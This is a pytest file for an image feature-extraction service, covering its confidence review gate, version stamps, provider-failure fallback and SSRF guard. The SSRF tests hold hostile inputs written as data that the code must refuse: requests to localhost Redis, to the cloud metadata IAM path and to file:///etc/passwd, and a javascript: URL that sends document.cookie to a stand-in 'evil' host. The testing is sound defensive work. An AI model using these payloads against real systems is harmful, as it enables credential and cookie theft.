"""Stage 04 · extraction review gate, failure behaviour, SSRF guard, stamps.

Master Prompt 04 work items 6 & 10; risk-register AI-02, AI-03, AI-18.
"""
from __future__ import annotations

import pytest

from ai.extraction_review import (
    AUTO_ACCEPT_THRESHOLD,
    FALLBACK_CONFIDENCE_CAP,
    review_decision,
)
from ai.feature_extractor import (
    FeatureExtractor,
    GeminiProvider,
    _fetch_image_bytes,
)
from ai.model_registry import EXTRACTION_PROMPT_VERSION
from ai.taxonomy import taxonomy_version


class TestReviewGate:
    def test_high_confidence_complete_extraction_auto_accepts(self):
        decision = review_decision({
            "confidence": 0.9, "style": ["modern"], "material": ["wood"],
        })
        assert decision["state"] == "auto_accept"
        assert not decision["needs_review"]

    def test_threshold_is_the_contracted_bar(self):
        assert AUTO_ACCEPT_THRESHOLD == 0.80

    def test_below_threshold_forces_review(self):
        decision = review_decision({
            "confidence": AUTO_ACCEPT_THRESHOLD - 0.01,
            "style": ["modern"], "material": ["wood"],
        })
        assert decision["needs_review"]
        assert "low_confidence" in decision["review_reasons"]

    def test_provider_error_forces_review_even_at_high_confidence(self):
        decision = review_decision({
            "confidence": 0.99, "style": ["modern"], "material": ["wood"],
            "provider_error": "HTTPError: 503",
        })
        assert decision["needs_review"]

    def test_missing_style_forces_review(self):
        decision = review_decision({"confidence": 0.9, "style": [], "material": ["wood"]})
        assert "missing_style" in decision["review_reasons"]

    def test_fallback_cap_cannot_reach_auto_accept(self):
        assert FALLBACK_CONFIDENCE_CAP < AUTO_ACCEPT_THRESHOLD

    def test_thresholds_are_stamped_for_auditability(self):
        decision = review_decision({"confidence": 0.5, "style": [], "material": []})
        assert decision["thresholds"]["auto_accept"] == 0.80


class TestExtractionStamps:
    def test_mock_extraction_carries_versions_and_review_state(self):
        result = FeatureExtractor().extract(
            "https://example.com/07-industrial-iron-bookshelf.jpg"
        )
        assert result["provider"] == "mock"
        assert result["model"] == "filename-heuristic"
        assert result["prompt_version"] == EXTRACTION_PROMPT_VERSION
        assert result["taxonomy_version"] == taxonomy_version()
        assert "needs_review" in result and "review_reasons" in result

    def test_mock_high_confidence_extraction_passes_gate(self):
        result = FeatureExtractor().extract(
            "https://example.com/07-industrial-iron-bookshelf.jpg"
        )
        assert not result["needs_review"]  # both style+material keywords present


class TestProviderFailureBehaviour:
    def test_dev_failure_uses_labelled_mock_fallback(self, monkeypatch):
        monkeypatch.setattr(
            "ai.feature_extractor.GeminiProvider.extract",
            lambda self, url: (_ for _ in ()).throw(RuntimeError("boom 503")),
        )
        ex = FeatureExtractor.__new__(FeatureExtractor)
        ex.provider = GeminiProvider()
        result = ex.extract("https://example.com/05-minimal-white-chair.jpg")
        assert result["provider"] == "mock-fallback"
        assert "boom 503" in result["provider_error"]
        assert result["confidence"] <= FALLBACK_CONFIDENCE_CAP
        assert result["needs_review"]
        assert "provider_error" in result["review_reasons"]

    def test_production_failure_never_fabricates(self, monkeypatch, reset_settings):
        reset_settings(APP_ENV="production")
        monkeypatch.setattr(
            "ai.feature_extractor.GeminiProvider.extract",
            lambda self, url: (_ for _ in ()).throw(RuntimeError("quota exceeded")),
        )
        ex = FeatureExtractor.__new__(FeatureExtractor)
        ex.provider = GeminiProvider()
        result = ex.extract("https://example.com/img.jpg")
        assert result["provider"] == "failed"
        assert result["style"] == [] and result["material"] == []
        assert result["confidence"] == 0.0
        assert result["needs_review"]
        assert "quota exceeded" in result["provider_error"]


class TestSsrfGuard:
    def test_private_address_fetch_is_refused(self):
        from app.core.url_safety import UnsafeUrl

        with pytest.raises(UnsafeUrl):
            _fetch_image_bytes("http://127.0.0.1:6379/steel.jpg")

    def test_metadata_address_fetch_is_refused(self):
        from app.core.url_safety import UnsafeUrl

        with pytest.raises(UnsafeUrl):
            _fetch_image_bytes("http://169.254.169.254/latest/meta-data/iam/sofa.jpg")

    def test_dangerous_scheme_is_refused(self):
        from app.core.url_safety import UnsafeUrl

        with pytest.raises(UnsafeUrl):
            _fetch_image_bytes("file:///etc/passwd")

    def test_openai_provider_validates_scheme_before_send(self, monkeypatch):
        """The OpenAI path hands the URL to the provider; the scheme check
        still rejects javascript:/data: before anything is sent."""
        from app.core.url_safety import UnsafeUrl

        provider = GeminiProvider.__new__(GeminiProvider)  # any provider
        monkeypatch.setattr(
            "ai.feature_extractor.httpx.post",
            lambda *a, **k: pytest.fail("http call must not happen for unsafe URL"),
        )
        with pytest.raises(UnsafeUrl):
            provider.extract("javascript:fetch('//evil/'+document.cookie)")
